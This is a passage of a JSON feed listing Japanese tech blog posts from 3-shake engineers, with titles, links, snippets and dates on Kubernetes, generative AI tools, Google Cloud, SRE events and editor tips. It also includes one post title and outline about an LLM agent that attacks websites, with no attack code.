AI+より。虚構新聞かと思いましたが（笑）、本当にようです。ベトナムの研究者が論文を出したのですね。日本でもCOBOLで書かれたシステムはまだまだ残っていますが、COBOL書けるエンジニアが高齢になってきて、後継者不足でもあります。海外もベトナムも同様なのですね。リプレイスしていくのも大事かと思いますが、全部のCOBOLシステムのリプレイスも難しいでしょうし、リプレイスしつつも、生成AIに書かせるのが現実解なのかもしれません。","isoDate":"2024-08-26T14:58:54.000Z","dateMiliSeconds":1724684334000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"IstioのサイドカーコンテナをKubernetesのサイドカーコンテナ機能で起動する","link":"https://zenn.dev/k_nagase/articles/istio_native_sidecar","contentSnippet":"はじめにKubernetes v1.29からサイドカーコンテナ機能が実装されました。これはメインコンテナとは別にロギングやプロキシのような周辺機能を追加するための機能です。Istioでもネットワークプロキシとしてenvoyコンテナをメインコンテナとは別にインジェクションし、1つのPodに仕立て上げます。しかしこれには問題があり、Jobを起動した際にメインコンテナが正常終了した後でもenvoyが終了せずにPodが残り続けてしまうといった事象がありました。こういったIstio利用における問題点を解消するのにKubernetesネイティブなサイドカーコンテナ機能が役立ちます。以降...","isoDate":"2024-08-26T04:15:35.000Z","dateMiliSeconds":1724645735000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"生成AIアプリケーション開発ノーコードフレームワークDify","link":"https://shu-kob.hateblo.jp/entry/2024/08/25/233704","contentSnippet":"dify.ai最近、Difyの話題をよく聞くので、軽くご紹介したいと思います。Difyとは？ 生成AIアプリ開発を劇的に簡素化するプラットフォームDifyは、生成AIアプリケーションをノーコードで開発できる、非常に革新的なプラットフォームです。これまで、生成AIアプリの開発は、高度なプログラミングスキルを必要とし、専門エンジニアでなければ実現が難しいものでした。しかし、Difyの登場により、この状況が一変。非エンジニアでも、直感的な操作で複雑なAIアプリケーションを構築できるようになりました。Difyが選ばれる理由ノーコード開発: プログラミングの知識がなくても、ブロックを組み合わせるように視覚的にアプリを構築できます。RAG（Retrieval Augmented Generation）対応: 大規模言語モデル（LLM）と外部データソースを連携させ、より高度なAI機能を実現できます。オープンソース: プラットフォーム自体がオープンソースであり、自由にカスタマイズ・拡張できます。高機能: チャットボット、AIアシスタント、要約ツールなど、さまざまなタイプの生成AIアプリを開発可能です。企業との連携: 既存の企業システムとの連携もスムーズに行え、業務効率化に貢献します。Difyの主な特徴柔軟性: AIプロセスを自由に組み合わせて、柔軟なアプリケーションを開発できます。統合性: 既存のシステムとの連携が容易で、企業内の既存のデータやシステムと統合できます。監視性: 実行時の状況を監視し、AIモデルの性能を継続的に改善できます。スケーラビリティ: 需要に応じて、簡単にシステムを拡張できます。Difyでできることチャットボットの開発: 自然な会話ができるチャットボットを簡単に作成できます。AIアシスタントの開発: 顧客対応や業務支援を行うAIアシスタントを開発できます。文書の自動生成: レポートや記事などを自動生成できます。データ分析: 大量のデータを分析し、有益な情報を抽出できます。Difyが注目される理由生成AIの民主化: 生成AIの技術を、より多くの人々に開放し、AIの活用範囲を広げます。開発コストの削減: 高度なエンジニアを雇用する必要がなく、開発コストを大幅に削減できます。開発期間の短縮: ノーコード開発により、開発期間を大幅に短縮できます。まとめDifyは、生成AIの開発を劇的に簡素化するプラットフォームです。非エンジニアでも、高度なAIアプリケーションを開発できるため、生成AIの活用範囲が大きく広がることが期待されています。もし、生成AIに興味があり、独自のアプリケーションを開発したいと考えているのであれば、Difyは非常に魅力的な選択肢と言えるでしょう。さらに詳しく知りたい方へDify公式サイト: https://dify.ai/jpDifyの始め方（非エンジニアでも生成AIアプリが作れる最強ツール）: https://zenn.dev/en2enzo2/articles/824877e1099508Difyは、生成AIの分野で注目を集めているプラットフォームです。ぜひ、この機会にDifyについて詳しく調べてみてください。何か他に知りたいことがあれば、お気軽にご質問ください。","isoDate":"2024-08-25T14:37:04.000Z","dateMiliSeconds":1724596624000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"高度情報の午前Ⅱ試験を解くならこのサイト","link":"https://shu-kob.hateblo.jp/entry/2024/08/24/225803","contentSnippet":"もうすぐ9月。秋の情報処理技術者試験も近づいてますね。私はプロジェクトマネージャ試験を受けるので頑張らねば。応用情報午前試験の過去問アプリはたくさんあるのですが、高度情報はないですよね。IPA公式の過去問をPDFで開かずとも、スマホで気軽に過去問演習したいところ。そこで、高度情報の午前Ⅱ試験を解くならこのサイトをご紹介したいと思います。情報処理技術者試験の勉強(過去問題)をやり直し過去問を1問1答形式で時進められます。全ての高度情報に対応しています。こちらを活用して、午前Ⅱは余裕で通過できるようにしておきましょう１","isoDate":"2024-08-24T13:58:03.000Z","dateMiliSeconds":1724507883000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"3-shake SRE Tech Talk #10無事終了。英語は大事w","link":"https://shu-kob.hateblo.jp/entry/2024/08/23/231736","contentSnippet":"3-shake.connpass.comshu-kob.hateblo.jp初のオンサイト開催となる3-shake SRE Tech Talk #10無事終了しました。詳しいことは後日書くとして、私は誘導係をしました。会場となったGoogleさんの渋谷オフィスは渋谷ストリームという新しい建物にあるのですが、エントランスの長いエスカレータの下で誘導していたら外国人2組に道を聞かれました（笑）スリーシェイクTシャツ着て立っていたから、建物の係りの人と思われた？1人目の方には、スマホを見せられ、渋谷ストリーム内の串カツ屋の場所を聞かれました。飲食店マップがあったので、3Fか4Fにあるみたい、と拙い英語で説明w2組目の二人には、スマホを見せられ、半蔵門線渋谷駅の場所を聞かれました。エスカレータを指差し、「（エスカレータを）Down, Purple is Line Color.（半蔵門線のラインカラーは紫）」とまた拙い英語で説明したら、「ありがと！（Arigato）」とお礼を言われました。面白い経験をするとともに、Googleの音声翻訳など便利なものを使えばよかったと思いました。今後はもうちょっとまともな英語を答えられるよう頑張るぞ！","isoDate":"2024-08-23T14:17:36.000Z","dateMiliSeconds":1724422656000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cilium L2 Announcement を使ってみる","link":"https://sreake.com/blog/learn-about-cilium-l2-announcement/","contentSnippet":"はじめに Sreake事業部でインターンをしている小林です。 本記事では、Cilium v1.14で追加されたCilium L2 Announcementを検証しました。 Kubernetes External Load […]The post Cilium L2 Announcement を使ってみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-08-23T01:10:11.000Z","dateMiliSeconds":1724375411000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2024年8月23日(金)は渋谷とオンラインにて3-shake SRE Tech Talk #10","link":"https://shu-kob.hateblo.jp/entry/2024/08/22/214001","contentSnippet":"shu-kob.hateblo.jp以前も書きましたが、2024年8月23日(金)は渋谷とオンラインにて3-shake SRE Tech Talk #10 です。初のオンサイト開催！（オンラインも併用）18:30からGoogle Cloudさんの渋谷オフィスで行います。無料の懇親会もあります。オンサイトは定員40人のところ、前日の8月22日21:36現在、37人と、3人の空きがあります。タイムテーブルはこちら株式会社Topotal 菱田 健太氏「SRE NEXT 2024 で形にしたバトンを渡せる仕組み」株式会社スリーシェイク 阿部貴晶「LLMのO11yに触れる」グーグルクラウドジャパン合同会社 中谷 祐輔氏「スポンサーセッション」弊社スリーシェイクからは「LLMのO11yに触れる」というテーマで、生成AIのオブザーバビリティの話があります。私も会場誘導係として、参加予定です。生成AIに興味ある方もぜひご参加ください。","isoDate":"2024-08-22T12:40:01.000Z","dateMiliSeconds":1724330401000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud DLP（Data Loss Prevention）を使ってデータのマスキングしてみた","link":"https://shu-kob.hateblo.jp/entry/2024/08/21/230415","contentSnippet":"DLP（Data Loss Prevention）とは？DLP（Data Loss Prevention）は、直訳で「データ損失防止」を意味し、企業や組織が保有する機密データや個人情報などの漏えいを防止するための仕組み、またはそのプロセス全体を指します。DLPの目的は、以下の通りです。機密データの特定: 個人情報、クレジットカード番号、社会保障番号など、企業にとって重要なデータを特定します。データの分類: 特定されたデータを、機密レベルや種類などに応じて分類します。データの保護: 分類されたデータに対して、アクセス制限、暗号化、匿名化などの適切な保護策を施します。データ漏えいの検出: データ漏えいが発生した場合、早期に検出し、その原因を特定します。Google CloudでDLPを使用してみたGoogle Cloud Storage上にある個人情報を含むテスト用テキストデータを用意し、下記記事の通り、コンソール上だけで個人情報のマスキングができました！便利！ops.jig-saw.comGeminiだけだとプロンプトを工夫してもマスキングはしてくれなかったので、DLPと併用しましょう。なお、要約文中に個人情報を入れるな、というプロンプトは言うことを聞いてくれました。","isoDate":"2024-08-21T14:04:15.000Z","dateMiliSeconds":1724249055000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"生成AIの出力形式を指定する","link":"https://shu-kob.hateblo.jp/entry/2024/08/20/235853","contentSnippet":"生成AIでの出力をプログラムで次の処理に使いたいときありますよね。そういうときは、正規化が必要だったりします。例えば、プロンプトでJSON形式で出力するように指定して、見本の形式も添えておけば、JSON形式で出力され、次の処理でとても使いやすくなります。","isoDate":"2024-08-20T14:58:53.000Z","dateMiliSeconds":1724165933000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"RAGの検索対象ファイル数","link":"https://shu-kob.hateblo.jp/entry/2024/08/19/235703","contentSnippet":"RAGアプリの開発で、対象ファイル1件の情報のみ出力してほしいのに、複数のファイルの内容が混ざって出力されることがありました。RAGの検索対象ファイル数を1にするだけで解決しました。最初は、ファイルごとにRAGを分けないといけないのでは？と思いやろうとすると超絶面倒そう。RAGの検索対象ファイル数を1にするだけでOKだと気づいてよかった！","isoDate":"2024-08-19T14:57:03.000Z","dateMiliSeconds":1724079423000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"エンジニア夏休み明けの仕事（Slackを使っている場合）","link":"https://shu-kob.hateblo.jp/entry/2024/08/18/233512","contentSnippet":"2024年。お盆休みをとって、8月19日(月)から仕事再開の方も多いと思います。最初に何をして、スムーズに仕事を再開できるかを書きたいと思います。Slackを使っていることを前提として書きます。夏季休暇の時期は自由で、自分はお盆休みとっても、とっていない方がメンションを飛ばしていることもあると思います。Slackのアクティビティで確認しましょう。量が多ければ、タスクを登録しましょう。JiraやNotionなどのカンバンボードに。Googleカレンダーを使用している場合は、カレンダー上でタスクを登録する手もあります。私はカンバンボードに加えて、ちょっとした作業はカレンダー上にタスクを登録したりしています。たくさんのメンションが来ている方もいらっしゃるかもしれませんが、一つずつ確実に消化していきましょう！お盆休み明けのお仕事頑張りましょうね！","isoDate":"2024-08-18T14:35:12.000Z","dateMiliSeconds":1723991712000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run 上の Next.js を OpenTelemetry で計装する","link":"https://zenn.dev/kimitsu/articles/nextjs-otel-on-cloud-run","contentSnippet":"Cloud Run はコンテナ化されたアプリケーションを実行するための Google Cloud のフルマネージドサービスです。Google Cloud 上でコンテナアプリを動かす場合、Cloud Run がファーストチョイスとなります。Next.js のデプロイ先としては Vercel が有名ですが、Google Cloud 上で動かしたい場合は Cloud Run になるでしょう。Next.js には Experimental ではありますが OpenTelemetry サポートがあり、Vercel でも Pro 以上のプランにすることでテレメトリを収集することができます。今...","isoDate":"2024-08-17T14:41:05.000Z","dateMiliSeconds":1723905665000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"つくって、壊して、直して学ぶ Kubernetes入門 Kindle版が期間限定で半額","link":"https://shu-kob.hateblo.jp/entry/2024/08/17/230505","contentSnippet":"つくって、壊して、直して学ぶ Kubernetes入門作者:高橋 あおい翔泳社AmazonKubernetesの入門書「つくって、壊して、直して学ぶ Kubernetes入門」Kindle版が期間限定で半額です！（2024年8月17日現在、終了まで5日）この書籍は、難解と言われるkubernetesをタイトル通りつくって、壊すハンズオンにより実践的に学べます！漫画も豊富に描いてあり、とっつきやすいです！私もこの半額キャンペーンでKindle版を買うて読んでいる最中です。発売も2024年4月なので、情報も新しいです。IT技術書はすぐに情報が古くなるので、最新の情報を読んでいく必要がありますからね。Kubernetesの入門書籍はこちらがダントツ一推しだと思います！","isoDate":"2024-08-17T14:05:05.000Z","dateMiliSeconds":1723903505000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LLMを利用して、APIを自動でテストするツールを作ってみる","link":"https://sreake.com/blog/llm-api-test-automation/","contentSnippet":"1. はじめに はじめまして、Sreake事業部の井上 秀一です。私はSreake事業部にて、SREや生成AIに関するResearch & Developmentを行っています。本記事では、LLMとテストツールを […]The post LLMを利用して、APIを自動でテストするツールを作ってみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-08-14T22:24:42.000Z","dateMiliSeconds":1723674282000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Docker Build Check について検証をしてみた","link":"https://sreake.com/blog/docker-build-check/","contentSnippet":"はじめに こんにちは、Sreake 事業部 佐藤慧太@(SatohJohn) です。 以下の docker build check という機能について、検証をし、Google Cloud の Cloud Build に組 […]The post Docker Build Check について検証をしてみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-08-13T01:00:00.000Z","dateMiliSeconds":1723510800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SRE支援の効果的なアプローチについて(SRE NEXT 2024登壇のRecap)","link":"https://zenn.dev/kojake_300/articles/b977011a04fce4","contentSnippet":"この記事は、SRE NEXT 2024で、株式会社スリーシェイクのスポンサーセッションとして登壇した「内製化を見据えた効果的なSRE支援のアプローチ」をセルフでRecapしたものになります。 はじめに株式会社スリーシェイクのSreake事業部に所属しています。2024年8月3日、4日に開催された SRE NEXT 2024 に「内製化を見据えた効果的なSRE支援のアプローチ」という題で登壇しました。20分の枠なのに60枚弱のスライドを作成するという暴挙に出てしまい、端折りながらの説明となってしまったため、Recapとして登壇内容を解説します。 想定読者本登壇資料は、SRE...","isoDate":"2024-08-08T09:18:01.000Z","dateMiliSeconds":1723108681000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Pandoc ONLINE #1で「PandocとLuaフィルタで作るプログラマブルな文書」について発表しました","link":"https://blog.atusy.net/2024/08/07/pandoc-online-1/","contentSnippet":"日本Pandocユーザ会主催の勉強会「Pandoc ONLINE #1」が開催されました。コミュニティ主催のsky_yさんが活動を再開していこうとしてらっしゃるので、これからが楽しみですね。勉強会後の雑談会では、Pandocの技術的な話はしばしば出てくるが、業務でどう使われているか、みたいな話がなかなか出てこないという感想もあったので、コミュニティが盛り上がってこのあたりの知見共有も進むといいなと思います。","isoDate":"2024-08-07T00:00:00.000Z","dateMiliSeconds":1722988800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Rで関数定義のジャンプがしょぼいわけ","link":"https://blog.atusy.net/2024/08/07/r-def-jumpt/","contentSnippet":"RStudioなどのエディタは、関数の定義ジャンプ機能を備えます。https://cran.r-project.org/web/packages/languageserver/index.html）。","isoDate":"2024-08-07T00:00:00.000Z","dateMiliSeconds":1722988800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"【SRE-NEXT 2024】内製化を見据えた効果的なSRE支援のアプローチ / SRE support approach","link":"https://speakerdeck.com/kojake_300/sre-next-2024-nei-zhi-hua-wojian-ju-etaxiao-guo-de-nasrezhi-yuan-noapuroti","contentSnippet":"","isoDate":"2024-08-03T04:00:00.000Z","dateMiliSeconds":1722657600000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"telescope.nvimでlive_grepした結果をファイル名で絞り込む","link":"https://blog.atusy.net/2024/08/02/telescope-grep-refiement/","contentSnippet":"Vim駅伝8/2の記事です。telescope.nvimはNeovim向けのファジーファインダーと類されるプラグインです。:Telescope live_grepがあり、プロジェクト内のファイルを正規表現で検索できます。しかし、検索結果が多いときに、ファイル名で絞り込みたいことがあります。たとえば、特定のディレクトリだけの結果が必要とか、テスト関係のファイルを除外したいとかいった状況があります。","isoDate":"2024-08-02T00:00:00.000Z","dateMiliSeconds":1722556800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"SLI、SLO、エラーバジェット導入の前に知っておきたいこと","link":"https://sreake.com/blog/sli-slo-good-practices/","contentSnippet":"1. はじめに こんにちは、「信頼性は可用性ではない」を標語にしているnwiizoです。 近年、サービスの信頼性向上に向けた取り組みとして、SLI（Service Level Indicator）、SLO（Service […]The post SLI、SLO、エラーバジェット導入の前に知っておきたいこと first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-30T03:12:29.000Z","dateMiliSeconds":1722309149000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Cloud Operator Days Tokyo 2024 にスリーシェイクのエンジニアが登壇","link":"https://sreake.com/blog/cloud-operator-days-tokyo-2024-%e3%81%ab%e3%82%b9%e3%83%aa%e3%83%bc%e3%82%b7%e3%82%a7%e3%82%a4%e3%82%af%e3%81%ae%e3%82%a8%e3%83%b3%e3%82%b8%e3%83%8b%e3%82%a2%e3%81%8c%e8%ac%9b%e5%b8%ab%e3%81%a8/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に在籍するエンジニアが、Cloud Operator Days 2024 実行委員会が主催する「Cloud Operator D […]The post Cloud Operator Days Tokyo 2024 にスリーシェイクのエンジニアが登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-25T01:11:09.000Z","dateMiliSeconds":1721869869000,"authorName":"Sreake","authorId":"Sreake"},{"title":"TTC Silent Bluish White Tactile Switchがよさげ","link":"https://blog.atusy.net/2024/07/25/ttc-silent-bluish-white-tactile-switch/","contentSnippet":"TTC Silent Bluish White Tactile Switchを購入しました。別所での評判の通り、押し始めのタクタイル感が強く、そのあとすとんと落ちる感じ。静音性も高い。軸のグラつきも気にならない。","isoDate":"2024-07-25T00:00:00.000Z","dateMiliSeconds":1721865600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"スリーシェイク、SRE NEXT 2024 にDIAMONDスポンサーとして協賛","link":"https://sreake.com/blog/srenext2024/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2024年8月3日（土）・8月4日（日）に@Abema Towersで開催される「SRE NEXT 2024」にDIAMO […]The post スリーシェイク、SRE NEXT 2024 にDIAMONDスポンサーとして協賛 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-23T01:18:53.000Z","dateMiliSeconds":1721697533000,"authorName":"Sreake","authorId":"Sreake"},{"title":"PandocでLuaオブジェクトをJSON文字列化する","link":"https://blog.atusy.net/2024/07/23/pandoc-lua-to-json/","contentSnippet":"ドキュメントの相互変換ツールであるPandocは、Lua言語のインタプリタを内蔵しており、便利なモジュールも様々に提供しています。pandoc luaでインタプリタを起動したり、pandoc lua hoge.luaでhoge.luaを実行したりもできちゃいます。","isoDate":"2024-07-23T00:00:00.000Z","dateMiliSeconds":1721692800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Webサイトを自律攻撃するLLMのロジックを考えた","link":"https://sreake.com/blog/llm_hacker_gpt/","contentSnippet":"目次 はじめに LLMによるハッキングの先行事例 シンプルなAssistants API を用いた攻撃 自律攻撃を行うエージェント 効果的なエージェントの作成の既存手法 ３エージェントによる計画・実行・再計画のループ機構 […]The post Webサイトを自律攻撃するLLMのロジックを考えた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-22T01:00:00.000Z","dateMiliSeconds":1721610000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Raspberry Pi 4 での USB Strage Driver","link":"https://blog.1q77.com/2024/07/raspberry-pi4-usb-strage-driver/","contentSnippet":"ラズパイが時々ハングアップするおうちの Raspberry Pi4 は USB で SSD Driver を接続して Samba で File Server にしているわけですが多くの Read/Write を行うとなぜか OS ごと Hangup するという問題がありました。最初は電源不足かなと思って電源を交換したりもしたのですが改善しませんでした。電源は TP-Link の HS105 経由にしているのでハングアップしたらリモートで電源 Off / On して復旧させていたわけですが不便なのでググって別の解決策を探してみたところそれらしいものがあったのでメモ。(HS105 は生産も終了しており、後継は Tapo P110M のようです)","isoDate":"2024-07-20T10:19:30.000Z","dateMiliSeconds":1721470770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"モダンインフラの基礎を学ぼう！実践コンテナ入門","link":"https://speakerdeck.com/bells17/motaninhuranoji-chu-woxue-hou-shi-jian-kontenaru-men","contentSnippet":"技育CAMPアカデミアでの発表資料です\\rhttps://talent.supporterz.jp/events/8cb9a300-506c-4d9d-b2af-e9924e0209a2/","isoDate":"2024-07-17T04:00:00.000Z","dateMiliSeconds":1721188800000,"authorName":"bells17","authorId":"bells17"},{"title":"Grafana Beylaの出来るコト出来ないコト","link":"https://zenn.dev/kojake_300/articles/4238a66124d095","contentSnippet":"この記事は、2024/6/28に登壇したJagu\'e\'r Jagu\'e\'r O11y-SRE \xd7 CloudNative コラボ Meetupのリマスターになります。 分散トレーシングの悩み突然ですが皆さん、分散トレーシングを実装する際、一度はこんなことを考えた経験はありませんか？特にクラウドインフラ出身の私は、意気揚々と分散トレーシングを実装しようとした時に、アプリケーションコードが書けずに全く歯が立たなかった苦い経験があります。。。でも、、ということで、本記事ではBeylaとは何者なのか、従来の分散トレーシングとは何が違うのかを解説していきます！\uD83D\uDCAA 分散トレーシ...","isoDate":"2024-07-15T15:07:47.000Z","dateMiliSeconds":1721056067000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"「Efficient Linux コマンドライン」から学んだこと","link":"https://zenn.dev/moz_sec/articles/2a849651de3fe1","contentSnippet":"はじめに本記事では、「Efficient Linux コマンドライン」を読んで、私自身が新たに学んだことについてメモしています。私がすでに知っていた情報については本記事に書いていないため、興味があればお手元に買って読んでみてください。この記事には書いていないこともたくさん書いてあります。この本の対象読者としては、Linuxの勉強を1からしたい人というよりは、Linuxをそこそこ触ったことがある人になると思います。\\"そこそこ触ったことがある\\"のレベルとしては、コマンドでディレクトリを変更したり、プログラムを実行したりしていれば十分です。336ページとそこまで長くもなく、またLi...","isoDate":"2024-07-15T08:51:51.000Z","dateMiliSeconds":1721033511000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"ShellScriptで自動化を楽にしたい時に知っておいても良いこと","link":"https://sreake.com/blog/shellscript-good-practices/","contentSnippet":"はじめに こんにちは、皆さん。今日は、シェルスクリプトを使った高度な自動化のベストプラクティスとパターンについて解説します。これらは、ちょっとした知識で実行でき、作業を大幅に効率化できるTipsです。シェルスクリプトは、 […]The post ShellScriptで自動化を楽にしたい時に知っておいても良いこと first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-14T23:08:45.000Z","dateMiliSeconds":1720998525000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Keycloakの歴史とSSO","link":"https://speakerdeck.com/melanmeg/keycloaknoli-shi-tosso","contentSnippet":"社内LT","isoDate":"2024-07-13T04:00:00.000Z","dateMiliSeconds":1720843200000,"authorName":"Naoya Yamamoto","authorId":"melanmeg"},{"title":"Pull requestの概要の作成とコードの改善を提案するツールを作ってみた","link":"https://sreake.com/blog/pr-guardian/","contentSnippet":"1. はじめに はじめまして、Sreake事業部でインターンをしている村山です。 今回は、PR Guardianというツールの開発と検証をしました。PR GuardianはPull Requestの概要の作成、コードの改 […]The post Pull requestの概要の作成とコードの改善を提案するツールを作ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-09T11:10:06.000Z","dateMiliSeconds":1720523406000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Platform Engineering と SRE の門 ","link":"https://speakerdeck.com/nwiizo/platform-engineering-to-sre-nomen","contentSnippet":"Platform Engineering とSREの門 というタイトルで登壇しました。入門のタイポではありません。\\r\\rイベント名: Platform Engineering Kaigi 2024\\rイベントURL:https://www.cnia.io/pek2024/\\r\\r登壇ブログ:『Platform Engineering とSREの門』という間違ったみたいなタイトルで登壇しました。 #PEK2024\\rhttps://syu-m-5151.hatenablog.com/entry/2024/07/09/215147","isoDate":"2024-07-09T04:00:00.000Z","dateMiliSeconds":1720497600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AWS SNSでエラー通知させ、SLOについて考える","link":"https://speakerdeck.com/melanmeg/aws-snsdeeratong-zhi-sase-slonituitekao-eru","contentSnippet":"以下、登壇資料。\\rJAWS-UG SRE支部 #9 初心者LT大会\\rhttps://jawsug-sre.connpass.com/event/321380/","isoDate":"2024-07-08T04:00:00.000Z","dateMiliSeconds":1720411200000,"authorName":"Naoya Yamamoto","authorId":"melanmeg"},{"title":"スリーシェイク、PagerDuty on Tour TOKYO 2024 にGoldスポンサーとして協賛","link":"https://sreake.com/blog/sponsor/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は 2024年8月6日（火）に東京ミッドタウンで開催される「PagerDuty on Tour TOKYO 2024」にGold […]The post スリーシェイク、PagerDuty on Tour TOKYO 2024 にGoldスポンサーとして協賛 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-05T01:19:54.000Z","dateMiliSeconds":1720142394000,"authorName":"Sreake","authorId":"Sreake"},{"title":"soci-snapshotter によるコンテナの起動時間削減について","link":"https://sreake.com/blog/container-lazy-pull-soci-snapshotter/","contentSnippet":"はじめに 近年、機械学習を使ったアプリケーションの需要が高まっており、Kubernetes と GPU を組み合わせて使うパターンが多く存在します。その中で問題となることの 1 つが、コンテナイメージのサイズが大きくなる […]The post soci-snapshotter によるコンテナの起動時間削減について first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-03T09:04:51.000Z","dateMiliSeconds":1719997491000,"authorName":"Sreake","authorId":"Sreake"},{"title":"space-agonを通して触るゲームインフラ","link":"https://sreake.com/blog/learn-game-infrastructure-from-space-agon/","contentSnippet":"はじめに Sreake 事業部でインターンをしている小川です。主にパブリッククラウド周辺に触れながら、 Kubernetes 関連の OSS の技術検証・調査をしています。 本調査では、Agones と Open Mat […]The post space-agonを通して触るゲームインフラ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-07-03T09:04:48.000Z","dateMiliSeconds":1719997488000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Lookerでもpivotがしたい!!","link":"https://zenn.dev/nedoko_dok0dko/articles/8c70b7bfa0cef4","contentSnippet":"whatLooker上でpivotテーブルができるかを調べてやってみたメモ Q． Lookerでpivotできるの…？A.できるhttps://www.cloudskillsboost.google/course_templates/323/video/432948?locale=jaLooker自身の仕様上、ExcelやLooker Studioのような操作感と少し違う点に注意。 対応グラフ表グラフ表グラフ(レガシー) やってみるExplorerを利用してできるので、簡単なデータを入れたテーブルを用意してやってみる。 利用環境データソース:...","isoDate":"2024-07-02T14:05:01.000Z","dateMiliSeconds":1719929101000,"authorName":"seno","authorId":"seno"},{"title":"eBPFで計装はノーコードの時代へ Grafana Beylaの出来るコト出来ないコト","link":"https://speakerdeck.com/kojake_300/ebpfdeji-zhuang-hanokodonoshi-dai-he-grafana-beylanochu-lai-rukotochu-lai-naikoto","contentSnippet":"","isoDate":"2024-07-01T04:00:00.000Z","dateMiliSeconds":1719806400000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"【Kubernetes☸️】\\"Findy 開発生産性 Conference\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/07/01/120000","contentSnippet":"発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️プラットフォーム設計導入のために、横断的コミュニケーションが必要であるプラットフォームエンジニアリングで、マルチプロダクトの生産性を支えるプラットフォームエンジニアリングで、各マイクロサービスの生産性を支える発表スライドから得られる知識イベント名発表スライド登壇映像文字起こし謝辞イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『マルチプロダクトの組織でマイクロサービスアーキテクチャを支えるCICDプラットフォーム設計』ていうテーマで、 Findy 開発生産性 Conference に登壇したぞ！発表スライドみんな！スライドぜってぇ見てくれよな！『Findy開発生産性Conference』の発表資料です✊\uD83C\uDFFBオラたちのプラットフォームエンジニアリング事例を紹介してっから、ぜってぇ見てくれよな！✋\uD83C\uDFFB#開発生産性con_findyhttps://t.co/DjqztPn9z4— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) June 28, 2024 ちな、発表内容はこの記事にも関連してるぜ！登壇映像Findyさんが登壇の映像を公開してくれました\uD83C\uDFA5文字起こしFindyさんが発表を文字起こししてくれました\uD83D\uDDE3️謝辞感謝するぜ！イベントで出会えた全ての方々に！！！\uD83E\uDEF6\uD83C\uDFFB株式会社スリーシェイクのブースにお邪魔させていただきました\uD83D\uDE4C#3shake_inc pic.twitter.com/W7ufgaKfbS— すてにゃん (@stefafafan) June 29, 2024","isoDate":"2024-07-01T03:00:00.000Z","dateMiliSeconds":1719802800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"♾️ マルチプロダクトの巨大組織でマイクロサービス開発を支えるCICDプラットフォーム設計","link":"https://speakerdeck.com/hiroki_hasegawa/marutipurodakutonozu-zhi-demaikurosabisuakitekutiyawozhi-erucicdpuratutohuomushe-ji","contentSnippet":"\\"Findy開発生産性Conference\\" の発表資料です✊\uD83C\uDFFB\\r\\r生産性を支えるためのプラットフォームエンジニアリング事例として、以下の３つの取り組みを紹介しました！\\r\\r・プラットフォーム設計導入のために、横断的コミュニケーションが必要である\\r・プラットフォームエンジニアリングで、マルチプロダクトの生産性を支える\\r・プラットフォームエンジニアリングで、各マイクロサービスの生産性を支える\\r\\r❓ はてなぶろぐ記事：https://hiroki-hasegawa.hatenablog.jp/entry/2024/07/01/120000\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1806559579180011572\\r\\r✍\uD83C\uDFFB 社内レポート：https://note.3-shake.com/n/n8efac1be167d\\r\\r\uD83D\uDDE3️ 